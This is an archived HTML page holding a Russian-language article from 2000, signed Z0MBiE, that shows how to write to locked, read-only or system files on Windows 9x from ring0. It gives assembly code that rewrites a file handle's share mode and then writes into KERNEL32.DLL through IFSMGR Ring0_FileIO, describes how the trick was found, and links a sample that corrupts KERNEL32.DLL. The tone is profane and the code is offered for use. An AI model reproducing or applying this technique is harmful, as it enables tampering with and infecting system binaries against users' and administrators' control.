<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title>Top Device</title>
</head>

<body bgcolor="#B1B1B1" text="#000000" topmargin="0"
leftmargin="3">

<p><STYLE> </p>

<p>INPUT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
}</p>

<p>SELECT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>OPTION { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>FORM { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
} <br>
BODY { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } <br>
P { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt }
TABLE { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
}TR { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } TD
{ FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 10pt
}TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } A { COLOR: #005500; TEXT-DECORATION: none }A:hover {
TEXT-DECORATION: underline } A:link { TEXT-DECORATION: none
}A:visited { }text:unknown { FONT-SIZE: 8pt } } </STYLE> </p>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tr>
        <td>&nbsp;</td>
        <td valign="top"><div align="center"><center><table
        border="0" cellpadding="0" cellspacing="0" width="100%">
            <tr>
                <td width="100%" bgcolor="#000000"><img
                src="../-.gif" width="1" height="1"></td>
            </tr>
            <tr>
                <td width="100%" bgcolor="#808080"><strong>15.04.2000</strong>
                   Win9X: Пишем в закрытые для записи файлы
             <strong>[Z0mbie]</strong></td>
            </tr>
            <tr>
                <td bgcolor="#000000"><img src="../-.gif"
                width="1" height="1"></td>
            </tr>
            <tr>
                <td><pre>

   Итак,  ВОТ  ОНО!!!  После нескольких часов ковыряния маздая и упорного
разглядывания  хексов  родились  две  ассемблерные команды, чему я весьма
рад,  ибо  давно  было  пора.  Но,  как  говорится, лучше послезавтра чем
завтра, и поэтому вам представляется взъеб маздайных шар (в ring0):

<font color="#0000A0">
; EBX=ring0 file handle, file may be opened in read-only mode
 mov     eax, [ebx+0Ch]            ; get some fucking pointer
 mov     byte ptr [eax+0Ch], 42h   ; set openmode to denynone, read-write
</font>

   Хотите еще? Ну тогда вот вам полный экземпл записи в KERNEL32.DLL, аки
же  в  любой  другой файл независимо от того, открыт ли он, системный или
еще какая хуйня:
<font color="#0000A0">
 ...
 mov     eax, R0_OPENCREATFILE
 mov     bx, 2044h       ; no i24, denynone, r/o
 mov     cx, 32          ; archive (unused here)
 mov     dx, 01h         ; fail | open
 lea     esi, filename
 VxDcall IFSMGR, Ring0_FileIO
 xchg    ebx, eax

 mov     eax, [ebx+0Ch]  ; fuck share:
 mov     byte ptr [eax+0Ch], 42h ; denynone, read-write

 mov     eax, R0_WRITEFILE
 mov     ecx, size buf
 xor     edx, edx      ; filepos
 lea     esi, buf
 VxDcall IFSMGR, Ring0_FileIO

 mov     eax, R0_CLOSEFILE
 VxDcall IFSMGR, Ring0_FileIO
 ...
</font>

   С  ring3 дело обстоит сложнее: чтобы наебать шары нужен хендл нулевого
кольца,  а  сгенерить его из ring3-хендла не так-то просто. Есть, правда,
функция:  IFSMGR_Win32_Get_Ring0_Handle,  но  она глюкавая и хуево как-то
вызывается.

   Метод, который применялся чтобы до всего этого допереть:
1. замечаем, что хендл файла в нулевом кольце суть поинтер куда-то-там
2. дальше видим, что по этому адресу (хендлу) куча офсетов
3. открываем два файла - один readonly и один readwrite
4. дампим и сравниваем память куда показывают офсеты из обоих хендлов
5. повторяем до полного охуения либо пока не станет все понятно ;-)

   Кроме  всего  прочего  было замечено: после 'mov eax, [ebx+0Ch]' в eax
будет  поинтер  на  структуру,  первый  дворд  которой  суть  поинтер  на
следующую  такую  же  структуру.  Из  этого можно поиметь например сканер
хендлов.

   В  качестве  бонуса  прилагается пример инвертирования первого байта в
KERNEL32.DLL,  а  так  же  инклюдники  для  перехода и работы с файлами в
ring0: <a href="../files/w9xshare.zip" target="main">w9xshare.zip</a>

                             Z0MBiE, <a href="http://z0mbie.cjb.net">http://z0mbie.cjb.net</a>
      </pre>
<a href="http://topdev.tsx.org"> Статья для журнала Top Device</a>                                     
             </td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
        </table>
        </center></div></td>
        <td>&nbsp;</td>
    </tr>
</table>

<p>&nbsp;</p>
</body>
</html>
